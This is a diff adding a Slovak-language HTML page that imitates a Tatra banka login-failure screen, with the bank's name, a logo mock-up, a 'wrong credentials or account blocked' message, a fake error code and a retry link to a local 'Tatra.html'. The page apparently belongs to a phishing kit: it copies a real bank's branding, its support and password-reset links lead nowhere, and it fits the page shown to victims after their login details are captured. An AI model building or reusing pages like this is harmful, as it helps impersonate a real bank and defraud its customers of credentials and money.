@@ -1,0 +1,129 @@
+﻿<!DOCTYPE html>
+<html lang="sk">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Tatra banka - Chyba prihlásenia</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Roboto, sans-serif;
+            background-color: #1d1e23;
+            color: #ffffff;
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        .header { background-color: #08080a; padding: 16px 24px; }
+        .logo { display: flex; align-items: center; gap: 12px; }
+        .logo-circle {
+            width: 32px; height: 32px;
+            border: 3px solid #0097fd;
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .logo-inner { width: 14px; height: 14px; background-color: #0097fd; border-radius: 50%; }
+        .logo-text { font-size: 18px; font-weight: bold; color: #ffffff; }
+        .main-content {
+            flex: 1;
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            padding: 40px 20px;
+        }
+        .error-container {
+            text-align: center;
+            max-width: 450px;
+            background-color: #2a2b31;
+            border-radius: 12px;
+            padding: 40px;
+        }
+        .error-icon-wrapper {
+            width: 80px; height: 80px;
+            margin: 0 auto 24px;
+            background-color: rgba(244, 0, 51, 0.15);
+            border-radius: 50%;
+            display: flex; align-items: center; justify-content: center;
+        }
+        .error-icon-wrapper svg { width: 40px; height: 40px; fill: #f40033; }
+        .error-title { font-size: 22px; font-weight: 600; margin-bottom: 16px; color: #f40033; }
+        .error-text { font-size: 15px; color: rgba(255,255,255,0.7); margin-bottom: 24px; line-height: 1.6; }
+        .error-details {
+            background-color: #1d1e23;
+            border: 1px solid rgba(244, 0, 51, 0.3);
+            border-radius: 8px;
+            padding: 16px;
+            margin-bottom: 24px;
+            text-align: left;
+        }
+        .error-details-title { font-size: 14px; font-weight: 600; color: #f40033; margin-bottom: 8px; }
+        .error-details-text { font-size: 13px; color: rgba(255,255,255,0.6); line-height: 1.5; }
+        .error-code {
+            font-family: monospace;
+            background-color: rgba(244, 0, 51, 0.1);
+            padding: 2px 6px;
+            border-radius: 4px;
+            color: #f40033;
+        }
+        .action-buttons { display: flex; flex-direction: column; gap: 12px; }
+        .btn-primary {
+            width: 100%; padding: 16px;
+            font-size: 16px; font-weight: 600;
+            background-color: #0097fd;
+            color: #ffffff;
+            border: none; border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+        .btn-primary:hover { background-color: #0086e0; }
+        .btn-secondary {
+            width: 100%; padding: 16px;
+            font-size: 16px; font-weight: 600;
+            background-color: transparent;
+            color: #0097fd;
+            border: 2px solid #0097fd;
+            border-radius: 8px;
+            cursor: pointer;
+            text-decoration: none;
+            display: inline-block;
+            text-align: center;
+        }
+        .btn-secondary:hover { background-color: rgba(0, 151, 253, 0.1); }
+        .help-link { margin-top: 24px; padding-top: 24px; border-top: 1px solid rgba(255,255,255,0.1); }
+        .help-link a { color: rgba(255,255,255,0.6); text-decoration: none; font-size: 14px; }
+    </style>
+</head>
+<body>
+    <div class="header">
+        <div class="logo">
+            <div class="logo-circle"><div class="logo-inner"></div></div>
+            <span class="logo-text">Tatra banka</span>
+        </div>
+    </div>
+    <div class="main-content">
+        <div class="error-container">
+            <div class="error-icon-wrapper">
+                <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            </div>
+            <h1 class="error-title">Nesprávne prihlasovacie údaje</h1>
+            <p class="error-text">Prihlásenie zlyhalo. Zadané prihlasovacie údaje sú nesprávne alebo účet bol dočasne zablokovaný.</p>
+            <div class="error-details">
+                <div class="error-details-title">Informácie o chybe</div>
+                <div class="error-details-text">
+                    Váš účet mohol byť zablokovaný z bezpečnostných dôvodov. 
+                    Ak si myslíte, že ide o chybu, kontaktujte zákaznícku podporu.<br><br>
+                    Kód chyby: <span class="error-code">AUTH_FAILED_003</span>
+                </div>
+            </div>
+            <div class="action-buttons">
+                <a href="Tatra.html" class="btn-primary">Skúsiť znova</a>
+                <a href="#" class="btn-secondary">Kontaktovať podporu</a>
+            </div>
+            <div class="help-link"><a href="#">Zabudli ste heslo?</a></div>
+        </div>
+    </div>
+</body>
+</html>
